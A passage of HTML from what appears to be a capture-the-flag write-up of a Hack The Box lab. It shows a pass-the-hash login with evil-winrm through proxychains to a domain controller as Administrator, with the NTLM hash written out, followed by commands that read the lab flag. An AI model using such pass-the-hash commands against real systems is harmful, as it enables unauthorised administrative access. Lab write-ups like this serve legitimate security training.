+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ proxychains</span><span class="p"> -q evil-winrm -i 172.16.249.200 -u Administrator -H 822601ccd7155f47cd955b94af1558be  
+PS C:\Users\Administrator\Documents> </span><span class="am">whoami</span><span class="p">
+htb\administrator
+PS C:\Users\Administrator\Documents> </span><span class="am">hostname</span><span class="p">
+DC
+PS C:\Users\Administrator\Documents> </span><span class="am">type</span><span class="p"> ..\Desktop\flag.txt
+XEN{d3r1v471v3_d0m41n_4dm1n}
+PS C:\Users\Administrator\Documents></span>
+</code></pre></div></div><br>
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
